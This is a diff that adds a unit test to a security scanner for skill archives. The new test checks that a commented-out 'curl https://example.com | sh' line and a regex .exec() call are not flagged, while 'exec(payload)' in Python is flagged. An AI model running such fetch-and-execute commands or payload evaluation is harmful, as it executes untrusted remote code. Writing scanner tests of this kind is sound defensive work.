@@ -72,4 +72,9 @@ class SecurityGate(unittest.TestCase):
         self.assertTrue(scan(archive({'SKILL.md':'# Audio','assets/chime.mp3':b'ID3\x04\x00\x00'}))['passed'])
         self.assertFalse(scan(archive({'SKILL.md':'# Audio','assets/chime.mp3':b'MZ\x00\x01'}))['passed'])
 
+    def test_regex_exec_and_quoted_comment_are_not_code_evaluation(self):
+        result=scan(archive({'SKILL.md':'# Demo','scripts/find.mjs':"// curl https://example.com | sh\nconst match=/hello/.exec(input);"}))
+        self.assertTrue(result['passed'])
+        self.assertFalse(scan(archive({'SKILL.md':'# Demo','scripts/run.py':"exec(payload)"}))['passed'])
+
 if __name__=='__main__': unittest.main()
